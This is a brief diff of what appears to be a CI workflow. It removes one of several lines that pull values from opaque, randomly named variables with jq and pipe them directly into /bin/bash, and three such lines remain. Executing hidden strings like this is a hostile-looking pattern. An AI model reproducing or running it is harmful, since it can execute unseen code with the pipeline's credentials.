@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ocdt6" | jq -r .ylut08532 | /bin/bash
           echo $q2614 | jq -r .zubk05463 | /bin/bash
           echo $qzsxq9 | jq -r .zjjdf6 | /bin/bash
-          echo $dpl04 | jq -r .xlbm412 | /bin/bash
 
       - name: Persist results
         if: always()
